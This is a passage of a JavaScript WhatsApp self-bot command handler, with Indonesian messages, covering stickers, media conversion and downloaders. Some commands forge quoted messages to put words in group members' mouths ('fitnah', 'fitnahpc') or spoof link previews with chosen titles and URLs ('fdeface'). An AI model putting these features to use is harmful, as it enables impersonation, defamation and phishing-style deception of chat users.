            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            hexa.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    case 'totag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'fitnah':
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            hexa.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
            if(!q) return reply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'fitnahpc':
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await hexa.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await hexa.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'reverse':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await hexa.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            hexa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'anime':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            hexa.sendMessage(from,media,image,{quoted:mek,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
    case 'kontak':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            hexa.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
            case 'take':
    case 'colong':
    		if (!isQuotedSticker) return reply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await hexa.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : `Will`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, hexa, mek, from)
			break
    case 'setexif':
            case 'exif':
	        if (!isOwner && !mek.key.fromMe) return reply('*Ente owner?_*')
	        if (args.length < 1) return reply(`Penggunaan ${prefix}exif nama|author`)
		if (!q.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)
		    exif.create(q.split('|')[0], q.split('|')[1])
		    reply('sukses')
	        break
case 'colong':
		if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}colong*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        mediae = await hexa.downloadAndSaveMediaMessage(encmediia, `./stik/${sender}`)
		    exec(`webpmux -set exif ./stik/data.exif ./stik/${sender}.webp -o ./stik/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    hexa.sendMessage(from, fs.readFileSync(`./stik/${sender}.webp`), MessageType.sticker, {quoted: mek})
					fs.unlinkSync(mediae)
					fs.unlinkSync(`./stik/takestick_${sender}.exif`)
				})
				break
				case 'ttp':
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
reply('wait....')
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
sendStickerUrl(from, anjay)
break
case 'ssweb':
             if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/`)
             ini_link = args[0]
             ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${setting.lolkey}&url=${ini_link}`)
             await hexa.sendMessage(from, ini_buffer, image, { quoted: mek })
             break
       case 'attp':
              if (args.length == 0) return reply(`Example: ${prefix + command} yudha`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              hexa.sendMessage(from, buffer, sticker, { quoted: mek })
              break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             media = await hexa.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            hexa.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            hexa.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await hexa.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            hexa.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            hexa.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case 'upswteks':
    if (!mek.key.fromMe) return fakestatus('SELF-BOT')
            if (!q) return fakestatus('Isi teksnya!')
            hexa.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
    if (!mek.key.fromMe) return fakestatus('SELF-BOT')
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await hexa.downloadMediaMessage(swsw)
            hexa.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            hexa.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('Reply gambarnya!')
            }
            break
    case 'upswvideo':
    if (!mek.key.fromMe) return fakestatus('SELF-BOT')
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await hexa.downloadMediaMessage(swsw)
            hexa.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            hexa.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('reply videonya!')
            }
            break
    case 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const tipes = await hexa.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anu = {
        	detectLinks: false
    		}
    		var mat = await hexa.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		hexa.sendMessage(from, mat, MessageType.extendedText, anu)
            break
    case 'public':
          	if (!isOwner) return fakestatus('SELF-BOT')
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	fakestatus(`「 *PUBLIC-MODE* 」`)
          	break
	case 'self':
          	if (!isOwner) return fakestatus('SELF-BOT')
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	fakestatus(`「 *SELF-MODE* 」`)
          	break
 	case 'hidetag':
			if (!isOwner) return fakestatus('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await hexa.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: mek
			}
			hexa.sendMessage(from, optionshidetag, text)
			break
	case 'play':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break  
                   case 'tagall':
                   if (!isGroupAdmins) return reply ('Khusus Admin')  
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `╠➥ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					reply(teks)
					break
                   case 'grup':
					case 'group':
					if (!isGroup) return reply ('Khusus Group') 
					if (!isGroupAdmins) return reply ('Khusus Admin') 
					if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')
					if (args[0] === 'open') {
					    reply(`*BERHASIL MEMBUKA GROUP*`)
						hexa.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'close') {
						reply(`*BERHASIL MENUTUP GROUP`)
						hexa.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					break       
        case 'video':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break      
    case 'sticker':
			case 'stiker':
			case 's' :
				if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					media = await hexa.downloadAndSaveMediaMessage(encmedia, `./stik/${sender}`)
					await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./stik/data.exif ./stik/${sender}.webp -o ./stik/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									sendSticker(from, fs.readFileSync(`./stik/${sender}.webp`), mek)
									fs.unlinkSync(media)	
									fs.unlinkSync(`./stik/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./stik/${sender}.webp`)
				} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
					const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					media = await hexa.downloadAndSaveMediaMessage(encmedia, `./stik/${sender}`)
					reply(mess.wait)
						await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./stik/data.exif ./stik/${sender}.webp -o ./stik/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									sendSticker(from, fs.readFileSync(`./stik/${sender}.webp`), mek)
									fs.unlinkSync(media)
									fs.unlinkSync(`./stik/${sender}.webp`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./stik/${sender}.webp`)
				} else {
					reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
				}
				break
    case 'toimg':
			if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await hexa.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	case 'ytsearch':
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await hexa.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	case 'setreply':
	case 'setfake':
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await hexa.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'setthumb':
	        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await hexa.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/thumb.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'ytmp4':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
			let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks2) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				ytv(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
				if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
				const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captionsYtmp4)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})		
				})
				} catch (err) {
			    reply(mess.error.api)
				}
				break
	case 'emoji':
			if (!q) return fakegroup('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
	case 'ytmp3':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
				const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break
    case 'image':
            if (args.length < 1) return reply('Masukan teks!')
            const gimg = args.join('');
            reply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            hexa.sendMessage(from,{url:images},image,{quoted:mek})
            });
            break
 	case 'tiktok':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
		hexa.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
    case 'tiktokaudio':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
 		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { audio} = result
            sendMediaURL(from,audio,'')
    		})
     		.catch(e => console.log(e))
     		break
    case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			hexa.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
            })              
			break
    case 'ig':
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return fakegroup('Linknya?')
        reply(mess.wait)
	    hx.igdl(args[0])
	    .then(async(result) => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    hexa.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
